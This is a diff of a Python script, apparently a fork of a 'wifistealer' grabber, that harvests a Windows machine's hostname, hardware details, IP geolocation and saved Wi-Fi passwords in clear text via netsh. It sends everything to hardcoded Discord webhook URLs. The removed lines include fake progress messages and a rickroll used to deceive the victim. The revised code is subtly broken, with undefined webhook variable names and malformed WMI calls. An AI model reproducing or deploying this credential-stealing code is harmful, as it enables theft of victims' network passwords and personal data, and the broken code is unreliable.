@@ -1,85 +1,69 @@
-import io #module is used for writing on files
-import subprocess # to access certain cmds like netsh
-import requests as pp #request used for scraping js websites
-import os as op #os is just op
-import webbrowser as poop #rickroll and SP :)
-import socket as poggchamp #getting hostname not nessecary can remove
-from dhooks import Webhook, File #sending webhooks
-import platform as halal #getting host names 
-import wmi # more info from windows (only works with windows)
+import io 
+import subprocess 
+import requests as req
+import os
+import webbrowser
+import socket
+from dhooks import Webhook, File
+import platform
+import wmi
 
+os.system("color 0a") 
+fname = "wifipasswords.txt"
 
-op.system("color 0a") #cool color in windows cmd
-fname = "holyshit.txt" #saves the ip data as txt files
+hostname = socket.gethostname()
+system_info = platform.uname()
 
-whobedum = poggchamp.gethostname() # gets the host name using socket module
-slay = halal.uname() #using the platform module grabs usefull info about host pc.
-windowsop = wmi.WMI() #using the wmi platform grab info about the windows pc.
-macsuxs = windowsop.Win32_ComputerSystem()[0] #Win32 module from wmi
+wifi_hook = Webhook("https://discord.com/api/webhooks/880554721922916402/1OL1oEL7pLryhFkGrCl7lNR5xethn5gms8JlEpRHbM-kVQwwutuZ7F00aq-a43pJcSHz")
+no_wifi_hook = Webhook("https://discord.com/api/webhooks/880554730462535751/TVU-jyTKMLkqE3BqXBE3xHMvEMRj-iX-5TXVaYkxfzYMYxrHkRh8kQn_tcjupCaKk9JU") 
+ip_hook = Webhook("https://discord.com/api/webhooks/880516595670192208/7H7vG-feqnASTWD8VyZzv2uBHo1y3zJ8dtANpVW6e1qcUcAgvmmuoduf9EGarg00nKk7") 
 
-Wbhook_wifi = Webhook("https://discord.com/api/webhooks/880554721922916402/1OL1oEL7pLryhFkGrCl7lNR5xethn5gms8JlEpRHbM-kVQwwutuZ7F00aq-a43pJcSHz")#wifipass gets dumped here
-Wbhook_nowifi = Webhook("https://discord.com/api/webhooks/880554730462535751/TVU-jyTKMLkqE3BqXBE3xHMvEMRj-iX-5TXVaYkxfzYMYxrHkRh8kQn_tcjupCaKk9JU") #nowifipass get dumped here
-Wbhook_ip = Webhook("https://discord.com/api/webhooks/880516595670192208/7H7vG-feqnASTWD8VyZzv2uBHo1y3zJ8dtANpVW6e1qcUcAgvmmuoduf9EGarg00nKk7") #ip data gets dumped here( using discord as a platform)
-x = pp.get("http://ip-api.com/json") #request module to scrape ip from ;;
-data = str(x.json()) #making scraped data str and json 
-print("Downloading Modules")
+ip_data = req.get("http://ip-api.com/json").json()
 
-with io.open(fname, 'w', encoding="utf-8") as pog:
-    pog.write(data) #writes the holyshit.txt file 
+with io.open(fname, 'w', encoding="utf-8") as file:
+    file.write(str(ip_data))
 
-
-# Following is the Message which goes in the first ip dump
-Wbhook_ip.send(f'''
-
-**--------------------------GRABBED_INFO-----------------------------**
-Hello There Young Lad,
-This is Hecker From Dark Web.
-Lmao just take the ip and get lost baibai. 
+ip_hook.send(f'''
 @everyone
+Hello there Young Lad,
 
-https://github.com/abhinav-ranish
-https://abhinavranish.gq
--------------------------------------------------------------------
-AbhiQ Grabber= 
-```yaml
----------------------------Precise Info---------------------------
-{data}
+Forked from https://github.com/abhinav-ranish/wifistealer
+**--------------------------GRABBED_INFO-----------------------------**
+Hostname = {hostname}
+IP Data = {ip_data}
 
----------------------------------------------------------------------
-```
-Hostname = {whobedum}
----------------------------------------------------------------------
 **---------------------------System Info-----------------------------**
-System = {slay.system}
-Node Name = {slay.node}
-Release = {slay.release}
-Machine = {slay.machine}
-Processor = {slay.processor}
-Version = {slay.version}
--------------------------------------------------------------------
-**----------------------------Windows PC----------------------------**
-Manufacturer = {macsuxs.Manufacturer}
-Model = {macsuxs. Model}
-Name = {macsuxs.Name}
-NumberOfProcessors = {macsuxs.NumberOfProcessors}
-SystemType = {macsuxs.SystemType}
-SystemFamily = {macsuxs.SystemFamily}
--------------------------------------------------------------------
-CC@ https://github.com/abhinav-ranish
--------------------------------------------------------------------
+System = {system_info.system}
+Node Name = {system_info.node}
+Release = {system_info.release}
+Machine = {system_info.machine}
+Processor = {system_info.processor}
+Version = {system_info.version}
 
+**----------------------------Windows PC----------------------------**
+Manufacturer = {wmi.WMI().Win32}
+
+
+Manufacturer = {wmi.WMI().Manufacturer}
+Model = {wmi.WMI().Model}
+Name = {wmi.WMI().Name}
+NumberOfProcessors = {wmi.WMI().NumberOfProcessors}
+SystemType = {wmi.WMI().SystemType}
+SystemFamily = {wmi.WMI().SystemFamily}
+-------------------------------------------------------------------
+CC@ https://github.com/abhinav-ranish/wifistealer
+-------------------------------------------------------------------
 '''
 )
 
 #Nowifi dump and since its on another channel creates a sub heading for new victims
 
-Wbhook_nowifi.send(f"**Hostname = {whobedum}**")
-Wbhook_wifi.send(f"**Node Name = {slay.node}**  **Name = {macsuxs.Name}** ")
+Wbhook_nowifi.send(f"**Hostname = {hostname}**")
 
-print("downloading python==1.39 -------------------/------------") #some fake shit like a pro gamer
-
+Wbhook_wifi.send(f"**Node Name = {system_info.node}**  **Name = {wmi.WMI().Name}** ")
 
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']).decode('utf-8').split('\n') #uses subprpocess module to acess windows cmds like netsh etc.
+
 profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
 for i in profiles:
     results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n') #use netsh windows network manager tool to see wifi pass in clear.
@@ -92,19 +76,6 @@ for i in profiles:
         print("Errors Found") #overules any errors and doesnt kill the code
 
 
-print("Checking For Updates") #fake shit :)
-
-print("Scanning....") #more fake shit
-
-print("Enjoy Life Beta.") #enjoy ur life beta
-
-input("Enter To See Results!") #rickrolls the person when click any button
-
-
-poop.open_new_tab("https://abhinavranish.gq")#my website
-poop.open_new_tab("https://github.com/abhinav-ranish")#my github
-poop.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ")#rickroll link
-
-print("Noob Gamer Get Rolled. For More Visit abhinaranish.gq")#fake shit
+print("Task Completed") 
 
 
